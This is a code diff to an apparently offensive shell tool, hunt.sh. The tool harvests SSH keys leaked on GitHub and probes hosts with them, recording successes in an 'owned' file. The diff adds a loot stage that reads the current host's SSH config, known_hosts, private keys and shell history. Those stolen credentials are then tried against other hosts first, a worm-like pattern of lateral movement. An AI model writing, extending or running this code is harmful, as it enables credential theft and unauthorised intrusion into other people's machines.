@@ -18,7 +18,8 @@ mkdir -p "$WORK/keys"
 TARGETS="$WORK/targets.txt"
 SEEN="$WORK/seen.txt"
 OWNED="$WORK/owned.txt"
-touch "$TARGETS" "$SEEN" "$OWNED"
+LOOT="$WORK/loot.txt"
+touch "$TARGETS" "$SEEN" "$OWNED" "$LOOT"
 
 # env wins over the file, so `GITHUB_TOKEN=x ./hunt.sh` still works
 env_token="${GITHUB_TOKEN:-}"; env_config="${CONFIG_URL:-}"
@@ -176,10 +177,15 @@ harvest() {
 
 # ---------------------------------------------------------------------------
 probe() {
-    if [ ! -s "$TARGETS" ]; then echo "hunt: no candidates to probe"; return 0; fi
+    if [ ! -s "$TARGETS" ] && [ ! -s "$LOOT" ]; then
+        echo "hunt: no candidates to probe"; return 0
+    fi
     [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
     tried=0
-    while IFS="$TAB" read -r key user host; do
+    # looted rows first: those triples were proven together on a live host,
+    # where the GitHub ones are only correlated by repo. Precision gets budget.
+    { cat "$LOOT" 2>/dev/null || :; cat "$TARGETS" 2>/dev/null || :; } \
+    | while IFS="$TAB" read -r key user host; do
         [ -n "${host:-}" ] || continue
         id="$user@$host"
         # Count a row only when it is actually attempted. Counting scanned rows
@@ -204,13 +210,23 @@ probe() {
             fi
         fi
         printf '%s\n' "$id" >> "$SEEN"
-    done < "$TARGETS"
+    done
     sort -u "$OWNED" -o "$OWNED" 2>/dev/null || true
 }
 
+# Read this host's own trust graph before harvesting: its ssh config,
+# known_hosts, own keys and history are far better edges than anything GitHub
+# can correlate, and hunt.sh probes loot.txt before its own rows.
+loot_now() {
+    if [ -r "$SELF_DIR/loot.sh" ]; then
+        HUNT_WORK="$WORK" sh "$SELF_DIR/loot.sh" || true
+    fi
+}
+
 case "${1:-all}" in
+    loot)    loot_now ;;
     harvest) harvest ;;
     probe)   probe ;;
-    all)     harvest; probe ;;
-    *)       echo "usage: $0 [harvest|probe|all]"; exit 2 ;;
+    all)     loot_now; harvest; probe ;;
+    *)       echo "usage: $0 [loot|harvest|probe|all]"; exit 2 ;;
 esac
